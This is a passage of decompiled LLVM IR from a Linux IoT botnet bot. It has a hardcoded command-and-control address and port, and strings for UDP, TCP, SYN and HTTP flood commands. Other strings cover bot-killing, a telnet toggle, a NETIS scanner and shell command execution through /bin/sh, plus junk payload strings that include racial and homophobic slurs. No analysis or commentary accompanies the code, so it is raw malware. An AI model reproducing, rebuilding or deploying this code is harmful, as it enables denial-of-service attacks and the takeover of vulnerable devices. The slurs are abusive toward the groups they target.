i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_805ce54.810, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_805cea4.811, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_805ced8.812, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_805cf0c.813, i32 0, i32 0)]
@global_var_805d070.818 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_805d0ae.819 = constant [6 x i8] c"arfgG\00"
@global_var_805d0b4.820 = constant [9 x i8] c"HBiug655\00"
@global_var_805d0bd.821 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_805d0ca.822 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_805d0de.823 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_805d0ef.824 = constant [12 x i8] c"GJjyur67458\00"
@global_var_805d0fb.825 = constant [12 x i8] c"RYSDk747586\00"
@global_var_805d107.826 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_805d113.827 = constant [10 x i8] c"KHGK7985i\00"
@global_var_805d11d.828 = constant [11 x i8] c"yuituiILYF\00"
@global_var_805d128.829 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_805d136.830 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_805d142.831 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_805d14f.832 = constant [9 x i8] c"ewqdcftr\00"
@global_var_805d158.833 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_805d168.834 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_805d173.835 = constant [12 x i8] c"twehgbferhb\00"
@global_var_805d17f.836 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_805d18b.837 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_805d199.838 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_805d1a7.839 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_805d1b5.840 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_805d1bf.841 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_805d1cd.842 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_805d1db.843 = constant [12 x i8] c"yteytietyue\00"
@global_var_805d1e7.844 = constant [9 x i8] c"qsortEQS\00"
@global_var_805d1f0.845 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_805d200.846 = constant [4 x i8] c"std\00"
@global_var_805d204.847 = constant [4 x i8] c"dts\00"
@global_var_805d208.848 = constant [6 x i8] c"hackz\00"
@global_var_805d20e.849 = constant [7 x i8] c"shdyed\00"
@global_var_805d215.850 = constant [5 x i8] c"http\00"
@global_var_805d21a.851 = constant [10 x i8] c"sghwiondc\00"
@global_var_805d224.852 = constant [7 x i8] c"nigger\00"
@global_var_805d22b.853 = constant [6 x i8] c"pussy\00"
@global_var_805d231.854 = constant [7 x i8] c"faggot\00"
@global_var_805d240.855 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805d0ae.819, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805d0b4.820, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805d0bd.821, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_805d0ca.822, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805d0de.823, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805d0ef.824, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805d0fb.825, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805d107.826, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805d113.827, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805d11d.828, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805d128.829, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805d136.830, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805d142.831, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805d14f.832, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805d158.833, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805d168.834, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805d173.835, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805d17f.836, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805d18b.837, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805d199.838, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805d1a7.839, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805d1b5.840, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805d1bf.841, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805d1cd.842, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805d1db.843, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805d1e7.844, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805d1f0.845, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805d200.846, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805d204.847, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805d208.848, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805d20e.849, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805d215.850, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805d21a.851, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805d224.852, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805d22b.853, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805d231.854, i32 0, i32 0)]
@global_var_805d2d0.856 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_805d2ec.857 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_805d30d.858 = constant [4 x i8] c"all\00"
@global_var_805d311.859 = constant i32 2037579820
@global_var_805d313.860 = constant [4 x i8] c"syn\00"
@global_var_805d317.861 = constant [4 x i8] c"rst\00"
@global_var_805d31b.862 = constant [4 x i8] c"fin\00"
@global_var_805d31f.863 = constant [4 x i8] c"ack\00"
@global_var_805d323.864 = constant [4 x i8] c"psh\00"
@global_var_805d327.865 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_805d339.866 = constant [6 x i8] c"PONG!\00"
@global_var_805d33f.867 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_805d34a.868 = constant [10 x i8] c"My IP: %s\00"
@global_var_805d354.869 = constant [8 x i8] c"BOTKILL\00"
@global_var_805d35c.870 = constant [13 x i8] c"Killing Bots\00"
@global_var_805d369.871 = constant [7 x i8] c"LOOPME\00"
@global_var_805d370.872 = constant [16 x i8] c"LOOPING PAYLOAD\00"
@global_var_805d380.873 = constant [7 x i8] c"TELNET\00"
@global_var_805d387.874 = constant [16 x i8] c"TELNET ON | OFF\00"
@global_var_805d397.875 = constant [4 x i8] c"OFF\00"
@global_var_8065770.876 = local_unnamed_addr global i32 0
@global_var_805d39b.877 = constant [5 x i8] c" OFF\00"
@global_var_805d3a0.878 = constant [3 x i8] c"ON\00"
@global_var_805d3a3.879 = constant [6 x i8] c"NETIS\00"
@global_var_805d3a9.880 = constant [25 x i8] c"[NETIS] SCANNER Starting\00"
@global_var_805d3c2.881 = constant [5 x i8] c"HOLD\00"
@global_var_805d3c7.882 = constant [5 x i8] c"JUNK\00"
@global_var_805d3cc.883 = constant [4 x i8] c"UDP\00"
@global_var_805d3d0.884 = constant [5 x i8] c"HTTP\00"
@global_var_805d3d5.885 = constant [4 x i8] c"CNC\00"
@global_var_805d3d9.886 = constant [6 x i8] c"COMBO\00"
@global_var_805d3df.887 = constant [4 x i8] c"STD\00"
@global_var_805d3e3.888 = constant [4 x i8] c"TCP\00"
@global_var_805d3e7.889 = constant [5 x i8] c"STOP\00"
@global_var_805d3ec.890 = constant [12 x i8] c"HOODASSSHIT\00"
@global_var_805f1b0.891 = local_unnamed_addr global i32 -1
@global_var_8058aa0.892 = constant [15 x i8] c"191.96.249.102\00"
@global_var_805f040.893 = global [15 x i8]* @global_var_8058aa0.892
@global_var_805f044.894 = local_unnamed_addr global i32 987
@global_var_805d3f8.895 = constant [8 x i8] c"8.8.8.8\00"
@global_var_805d400.896 = constant [16 x i8] c"/proc/net/route\00"
@global_var_805d410.897 = constant [11 x i8] c"\0900000000\09\00"
@global_var_805d41b.899 = constant [16 x i8] c"/usr/bin/python\00"
@global_var_805d42b.900 = constant [7 x i8] c"SERVER\00"
@global_var_805d432.901 = constant [7 x i8] c"ROUTER\00"
@global_var_805d439.902 = constant i32 1752396544
@global_var_805d43a.903 = constant [5 x i8] c"sshd\00"
@global_var_805d43f.904 = constant [19 x i8] c"/usr/sbin/dropbear\00"
@global_var_805f1ac.905 = local_unnamed_addr global i32 1
@global_var_805d452.906 = constant [13 x i8] c"BUILD %s:%s\0A\00"
@global_var_805d45f.907 = constant i32 1331036207
@global_var_805d46c.909 = constant i32 993090331
@global_var_805d4e8.910 = constant [5 x i8] c"PONG\00"
@global_var_805d4ed.911 = constant [4 x i8] c"DUP\00"
@global_var_805d4f1.912 = constant [8 x i8] c"%s 2>&1\00"
@1 = constant i32 2097266
@global_var_805d4fb.914 = constant i32 32
@global_var_805f23c = external local_unnamed_addr global i32
@global_var_8065740.920 = global i32 0
@global_var_805db00.921 = constant i32 0
@global_var_805f260.922 = global i32 0
@global_var_805f278.923 = global i32 0
@global_var_805f25c.924 = global i32* bitcast (i16* @global_var_805f2a0.917 to i32*)
@global_var_805db18.925 = constant [6 x i8] c"(nil)\00"
@global_var_805db1e.926 = constant [7 x i8] c"(null)\00"
@global_var_805db25.927 = constant i32 2949163
@global_var_805db92.929 = constant i32 327688
@global_var_805db8a.930 = constant [8 x i8] c" +0-#'I\00"
@global_var_805db38.931 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_805db75.932 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_805db6b.933 = constant i32 117506048
@global_var_805db5c.934 = constant i32 331776
@global_var_805dbe0.935 = constant [8 x i8] c"Success\00"
@global_var_805dbb6.936 = constant [15 x i8] c"Unknown error \00"
@global_var_805eb80.937 = constant i32 65536
@global_var_805f4a0.938 = local_unnamed_addr global i32* @global_var_805eb80.937
@global_var_8065520.939 = global i32 0
@global_var_805e7bc.940 = constant [15 x i8] c"Resolver error\00"
@global_var_805e742.941 = constant [8 x i8] c"Error 0\00"
@global_var_805e74a.942 = constant [13 x i8] c"Unknown host\00"
@global_var_805e757.943 = constant [25 x i8] c"Host name lookup failure\00"
@global_var_805e770.944 = constant [21 x i8] c"Unknown server error\00"
@global_var_805e785.945 = constant [32 x i8] c"No address associated with name\00"
@global_var_805e7a8.946 = constant [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805e742.941, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805e74a.942, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_805e757.943, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_805e770.944, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_805e785.945, i32 0, i32 0)]
@global_var_805e7cb.947 = constant [3 x i8] c": \00"
@global_var_805e7cd.948 = constant i32 0
@global_var_805e73a.949 = constant [8 x i8] c"%s%s%s\0A\00"
@global_var_8065524.950 = global i32 0
@global_var_8065540.951 = global i32 0
@global_var_806570c.952 = global i32 0
@global_var_805f4a8.953 = global i32 0
@global_var_8065b94.954 = local_unnamed_addr global i32 0
@global_var_8065b88.955 = global i32 0
@global_var_8065780.956 = global i32 0
@global_var_805f390.957 = global i32 0
@global_var_806582c.959 = global i32 0
@global_var_8065830.960 = local_unnamed_addr global i32 0
@global_var_8065834.961 = global i32 0
@global_var_8065840.962 = local_unnamed_addr global i32 0
@global_var_8065b34.963 = global i32 0
@global_var_8065b5c.964 = local_unnamed_addr global i32 0
@global_var_8065b4c.965 = local_unnamed_addr global i32 0
@global_var_8065b50.966 = local_unnamed_addr global i32 0
@global_var_8065b54.967 = local_unnamed_addr global i32 0
@global_var_8065b70.968 = local_unnamed_addr global i32 0
@global_var_8065b58.969 = local_unnamed_addr global i32 0
@global_var_8065b64.970 = local_unnamed_addr global i32 0
@global_var_8065b68.971 = local_unnamed_addr global i32 0
@global_var_8065b74.972 = local_unnamed_addr global i32 0
@global_var_8065b48.973 = local_unnamed_addr global i32 0
@global_var_8065b44.975 = local_unnamed_addr global i32 0
@global_var_8065b6c.976 = local_unnamed_addr global i32 0
@global_var_806583c.977 = local_unnamed_addr global i32 0
@global_var_805f3a8.978 = global i32 0
@global_var_805f3c0.980 = global i32 0
@global_var_805f3d8 = external global i32
@global_var_805f404.982 = global i32 -1726662223
@global_var_805f3e0.983 = local_unnamed_addr global i32* @global_var_805f404.982
@global_var_805f3dc.984 = global i32* @global_var_805f404.982
@global_var_805e7f4.985 = constant i32 0
@global_var_805e7e0.986 = constant i32 0
@global_var_805e808.987 = constant [3 x i8] c"-c\00"
@global_var_805e810.988 = constant [3 x i8] c"sh\00"
@global_var_805e80b.989 = constant [8 x i8] c"/bin/sh\00"
@global_var_805f480.990 = global i32 0
@global_var_8065724.991 = local_unnamed_addr global i32 0
@global_var_806572c.992 = local_unnamed_addr global i32 0
@global_var_805f000.994 = global i32 -1
@global_var_80554fb.995 = constant i32 -294069
@global_var_8065734.996 = local_unnamed_addr global i32 0
@global_var_8065738.997 = local_unnamed_addr global i32 0
@global_var_805ea6c.998 = constant [10 x i8] c"/dev/null\00"
@global_var_8065730.1000 = local_unnamed_addr global i32 0
@global_var_8065728.1001 = local_unnamed_addr global i32 0
@global_var_80556e3.1003 = constant i32 1928542531
@global_var_8055707.1004 = constant i32 1928542531
@global_var_8065764.1005 = local_unnamed_addr global i32 0
@global_var_8065744.1006 = global i32 0
@global_var_805ed90.1008 = constant [4 x i8] c"inf\00"
@global_var_805ed93.1013 = constant i32 1179535616
@global_var_805eda0.1014 = constant i32 2883630
@global_var_8065b98.1018 = local_unnamed_addr global i32 0
@global_var_805ee5c.1019 = constant i32 1697579054
@global_var_805ee90.1020 = constant i32 1868824690
@global_var_805ee5e.1021 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_805ee6f.1022 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_805ee87.1023 = constant [11 x i8] c"nameserver\00"
@global_var_805ee92.1024 = constant [7 x i8] c"domain\00"
@global_var_805ee99.1025 = constant [7 x i8] c"search\00"
@global_var_8065b78.1026 = global i32 0
@global_var_8065b9c.1027 = local_unnamed_addr global i32 0
@global_var_8065ba0.1028 = local_unnamed_addr global i32 0
@global_var_8063504.1029 = local_unnamed_addr global i32 0
@global_var_8063508.1030 = local_unnamed_addr global i32 0
@global_var_805f290.1031 = local_unnamed_addr global i32 2
@global_var_805eeb4.1032 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_805eeb1.1034 = constant [3 x i8] c"%x\00"
@global_var_805eec5.1035 = constant [11 x i8] c"/etc/hosts\00"
@global_var_805eed0.1036 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_805f4c0.1 = local_unnamed_addr global i8 0
@global_var_8063500.13 = external local_unnamed_addr global i8*
@global_var_805f4e0.20 = external local_unnamed_addr global i8*
@global_var_805f4f7.27 = local_unnamed_addr global i8 0
@global_var_805f4f8.28 = local_unnamed_addr global i8 0
@global_var_805f4f9.29 = local_unnamed_addr global i8 0
@global_var_805f4fa.30 = local_unnamed_addr global i8 0
@global_var_805f4f6.230 = local_unnamed_addr global i8 0
@global_var_805f4f0.898 = external global i8*
@global_var_805f2a0.917 = global i16 288
@global_var_805f2f0.918 = local_unnamed_addr global i16 272
@global_var_805dbaa.928 = external constant i8*
@global_var_8065800.958 = global i8 0
@global_var_8065b60.974 = local_unnamed_addr global i8 0
@global_var_8065720.979 = local_unnamed_addr global i8 0
@global_var_806573c.999 = local_unnamed_addr global i8 0
@global_var_805edc0.1011 = constant x86_fp80* null
@global_var_8065748.1015 = external global i8*
@global_var_8065760.1016 = local_unnamed_addr global i64 0
@global_var_805f4a4.1017 = local_unnamed_addr global i16 1
@global_var_805d4f9.913 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 94071
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_805f4c0.1, align 64
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048102_crit_edge

entry.dec_label_pc_8048102_crit_edge:             ; preds = %entry
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_805f024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_805f024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_805f024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_805f4c0.1, align 64
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %entry.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %entry.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805f024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_805f4c0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_805eee4.4 to i32))
  br label %dec_label_pc_804814a

dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* @global_var_805f010.6, align 16
  %v1_804814f = icmp eq i32 %v0_804814a, 0
  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %v9_8048184 = call i32 @__uClibc_main(i32 134551043, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134580852, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  ret i32 %v9_8048184

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_805f500.7, align 256
  %v1_804819d = add i32 %arg1, -1640531527
  store i32 %v1_804819d, i32* @global_var_805f504.8, align 4
  %v1_80481aa = add i32 %arg1, 1013904242
  store i32 %v1_80481aa, i32* %eax.global-to-local, align 4
  store i32 %v1_80481aa, i32* @global_var_805f508.9, align 8
  br label %dec_label_pc_80481bd

dec_label_pc_80481bd:                             ; preds = %entry, %dec_label_pc_80481bd
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_80481ed, %dec_label_pc_80481bd ]
  %v1_80481c3 = add nsw i32 %storemerge5, -3
  store i32 %v1_80481c3, i32* %eax.global-to-local, align 4
  %v1_80481c6 = mul nuw nsw i32 %v1_80481c3, 4
  %v2_80481c6 = add i32 %v1_80481c6, ptrtoint (i32* @global_var_805f500.7 to i32)
  %v3_80481c6 = inttoptr i32 %v2_80481c6 to i32*
  %v4_80481c6 = load i32, i32* %v3_80481c6, align 4
  %v1_80481d0 = add nsw i32 %storemerge5, -2
  store i32 %v1_80481d0, i32* %eax.global-to-local, align 4
  %v1_80481d3 = mul nuw nsw i32 %v1_80481d0, 4
  %v2_80481d3 = add i32 %v1_80481d3, ptrtoint (i32* @global_var_805f500.7 to i32)
  %v3_80481d3 = inttoptr i32 %v2_80481d3 to i32*
  %v4_80481d3 = load i32, i32* %v3_80481d3, align 4
  %v2_80481da = xor i32 %v4_80481d3, %v4_80481c6
  %v2_80481df = xor i32 %storemerge5, -1640531527
  %v1_80481e1 = xor i32 %v2_80481df, %v2_80481da
  store i32 %v1_80481e1, i32* %eax.global-to-local, align 4
  %v2_80481e6 = mul nuw nsw i32 %storemerge5, 4
  %v3_80481e6 = add i32 %v2_80481e6, ptrtoint (i32* @global_var_805f500.7 to i32)
  %v4_80481e6 = inttoptr i32 %v3_80481e6 to i32*
  store i32 %v1_80481e1, i32* %v4_80481e6, align 4
  %v4_80481ed = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_80481ed, 4096
  br i1 %exitcond, label %dec_label_pc_80481f9, label %dec_label_pc_80481bd

dec_label_pc_80481f9:                             ; preds = %dec_label_pc_80481bd
  %v0_80481fa = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80481fa

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80481bd, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048217 = load i32, i32* @global_var_805f1b8.10, align 8
  %v1_804821c = add i32 %v0_8048217, 1
  %v1_804821d = urem i32 %v1_804821c, 4096
  store i32 %v1_804821d, i32* @global_var_805f1b8.10, align 8
  %v1_804822c = mul nuw nsw i32 %v1_804821d, 4
  %v2_804822c = add i32 %v1_804822c, ptrtoint (i32* @global_var_805f500.7 to i32)
  %v3_804822c = inttoptr i32 %v2_804822c to i32*
  %v4_804822c = load i32, i32* %v3_804822c, align 4
  %v7_8048249 = udiv i32 %v4_804822c, 228675
  store i32 %v7_8048249, i32* @global_var_805f1b4.11, align 4
  br i1 true, label %dec_label_pc_8048299, label %dec_label_pc_804828b

dec_label_pc_804828b:                             ; preds = %entry
  br label %dec_label_pc_8048299

dec_label_pc_8048299:                             ; preds = %entry, %dec_label_pc_804828b
  %v1_80482ae = mul nuw nsw i32 %v1_804821d, 4
  %v2_80482ae = add i32 %v1_80482ae, ptrtoint (i32* @global_var_805f500.7 to i32)
  %v3_80482ae = inttoptr i32 %v2_80482ae to i32*
  %v4_80482ae = load i32, i32* %v3_80482ae, align 4
  ret i32 %v4_80482ae

; uselistorder directives
  uselistorder i32 %v1_804821d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048299, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_80482be = load i32, i32* @edi, align 4
  store i32 %v0_80482be, i32* %stack_var_-8, align 4
  %v4_80482c9 = ptrtoint i8* %arg1 to i32
  store i1 false, i1* @df, align 1
  %v3_80482da = call i32 @_strlen(i8* %arg1)
  %v1_80482e1 = add i32 %v3_80482da, -1
  br label %dec_label_pc_80482ea

dec_label_pc_80482e7:                             ; preds = %dec_label_pc_80482ea
  %v4_80482e7 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_80482ea

dec_label_pc_80482ea:                             ; preds = %entry, %dec_label_pc_80482e7
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_80482e7, %dec_label_pc_80482e7 ]
  %v6_80482ed = add i32 %stack_var_-16.0, %v4_80482c9
  %v1_80482f0 = inttoptr i32 %v6_80482ed to i8*
  %v2_80482f0 = load i8, i8* %v1_80482f0, align 1
  %v2_80482f3 = sext i8 %v2_80482f0 to i32
  %v1_80482f9 = call i32 @isspace(i32 %v2_80482f3)
  %v1_80482fe = icmp eq i32 %v1_80482f9, 0
  %v1_8048300 = icmp eq i1 %v1_80482fe, false
  br i1 %v1_8048300, label %dec_label_pc_80482e7, label %dec_label_pc_8048307.preheader

dec_label_pc_8048307.preheader:                   ; preds = %dec_label_pc_80482ea
  %v5_804830d18 = icmp slt i32 %v1_80482e1, %stack_var_-16.0
  br i1 %v5_804830d18, label %dec_label_pc_8048327, label %dec_label_pc_804830f

dec_label_pc_8048304:                             ; preds = %dec_label_pc_804830f
  %v4_8048304 = add i32 %stack_var_-12.019, -1
  %v5_804830d = icmp slt i32 %v4_8048304, %stack_var_-16.0
  br i1 %v5_804830d, label %dec_label_pc_8048327, label %dec_label_pc_804830f

dec_label_pc_804830f:                             ; preds = %dec_label_pc_8048307.preheader, %dec_label_pc_8048304
  %stack_var_-12.019 = phi i32 [ %v4_8048304, %dec_label_pc_8048304 ], [ %v1_80482e1, %dec_label_pc_8048307.preheader ]
  %v6_8048312 = add i32 %stack_var_-12.019, %v4_80482c9
  %v1_8048315 = inttoptr i32 %v6_8048312 to i8*
  %v2_8048315 = load i8, i8* %v1_8048315, align 1
  %v2_8048318 = sext i8 %v2_8048315 to i32
  %v1_804831e = call i32 @isspace(i32 %v2_8048318)
  %v1_8048323 = icmp eq i32 %v1_804831e, 0
  %v1_8048325 = icmp eq i1 %v1_8048323, false
  br i1 %v1_8048325, label %dec_label_pc_8048304, label %dec_label_pc_8048327

dec_label_pc_8048327:                             ; preds = %dec_label_pc_8048304, %dec_label_pc_804830f, %dec_label_pc_8048307.preheader
